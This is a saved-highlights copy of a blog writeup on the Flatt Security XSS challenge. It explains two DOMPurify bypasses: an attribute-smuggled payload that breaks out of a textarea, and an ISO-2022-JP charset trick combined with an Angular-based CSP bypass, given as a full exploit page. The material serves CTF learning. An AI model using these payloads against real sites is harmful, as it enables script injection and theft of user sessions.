---
author: "blig.one"
aliases: "Flatt Security XSS Challenge - Writeup"
tags: RW_inbox, readwise/articles
url: https://blig.one/2024/11/29/flatt-xss-writeup.html
date: 2025-02-04
---
# Flatt Security XSS Challenge - Writeup

![rw-book-cover](https://readwise-assets.s3.amazonaws.com/static/images/article0.00998d930354.png)

## Highlights


Server-Side Sanitization by hamayanhamayan [Permalink](https://blig.one/2024/11/29/flatt-xss-writeup.html/#server-side-sanitization-by-hamayanhamayan)
 This was the easiest among all the challenges, yet it teaches a nice quirk to achieve XSS when server-side sanitization is applied.
[View Highlight](https://read.readwise.io/read/01jk8q0swbkbc0vhsgx4p71d5s)



There is some server-side logic where a query parameter is sanitized via my everlasting enemy DOMPurify. Once sanitized, the payload is reflected into the page in two different points.
 <div class="card">
 <h1>Paper Airplane</h1>
 <p class="message"><%- sanitized %></b></p>
 <form method="get" action="">
 <textarea name="message"><%- sanitized %></textarea>
 <p>
 <input type="submit" value="View 👀" formaction="/" />
 </p>
 </form>
 </div>
[View Highlight](https://read.readwise.io/read/01jk8q16ktr13gy1rxfvjpyp2m)



How we can achieve XSS is quite simple. Essentially the sanitization that occurs server side has no context on what will be the context where our payload will be reflected.
 By leveraging this assumption we can carefully create an HTML tag that when injected into the browser breaks the context but will be completely ignored by DOMPurify. How? By using attributes
 <a id='</textarea><img src=a onerror=alert(origin)>'/>
[View Highlight](https://read.readwise.io/read/01jk8q24waa4wyxpqcsej87878)



The content of the `id` attribute will be completely ignored by DOMPurify, but when injected into the page it will break the `textarea` tag
[View Highlight](https://read.readwise.io/read/01jk8q3h0sccc22nvw1kg0y112)



<div class="card"> <h1>Paper Airplane</h1> <p class="message"><a id="</textarea><img src=a onerror=alert(origin)>"></a></p> <form method="get" action=""> <textarea name="message">&lt;ant"></textarea><img src="a" onerror="alert(origin)">"&gt; <p> <input type="submit" value="View 👀" formaction="/"> </p> </form> </div>
[View Highlight](https://read.readwise.io/read/01jk8q49smdfspb42wdhc51dzw)



Charset Shenanigans by kinugawamasato - w/ strellic [Permalink](https://blig.one/2024/11/29/flatt-xss-writeup.html/#charset-shenanigans-by-kinugawamasato---w-strellic)
[View Highlight](https://read.readwise.io/read/01jk8qz82b7b3yxddn02f3v2sx)



The main idea is explained here https://www.sonarsource.com/blog/encoding-differentials-why-charset-matters/. In short, it explains how the charset affects how the browser parses the HTML on the page. Moreover it highlights a specific encoding `ISO-2022-JP` which can be leveraged to achieve XSS on pages where the `Content-Type` header has no charset specified.
[View Highlight](https://read.readwise.io/read/01jk8qzp74gtceh3nm99364382)



If you have read the research, you may know that the sequence `\x1b(B` is used to switch the parsing to ASCII. Hence, something like `<style>\x1b(B<\x1b(Bimg</style>` should work. And indeed it works. This payload will be left untouched from DOMPurify since it’s considered safe. Spoiler: it’s not
[View Highlight](https://read.readwise.io/read/01jk8qzydm974v47gsyfy3m9c5)



Now we have all we need. I should point out that there is CSP but is easily bypassable (i’ve used cspbypass.com in order to find the payload)
[View Highlight](https://read.readwise.io/read/01jk8r09ndjha7f80wy2wqe0y8)
> #tools 


<html> <head></head> <body></body> <script> const URL = `https://challenge-kinugawa.quiz.flatt.training/?html=` const back_to_ascii = `\x1b(B` const back_to_jp = `\x1b$B`; const payload = `${back_to_jp} <style> ff${back_to_ascii}<${back_to_ascii}body ng-app ng-csp> ${back_to_ascii}<${back_to_ascii}script src='https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.5/angular.js'>${back_to_ascii}<${back_to_ascii}/script> ${back_to_ascii}<${back_to_ascii}input autofocus ng-focus=$event.composedPath()|orderBy:'[].constructor.from([origin],alert)'> </style>` open(URL+encodeURIComponent(payload),'iframe') </script> </html>
[View Highlight](https://read.readwise.io/read/01jk8r185xc4enk2jvvev6zrmp)

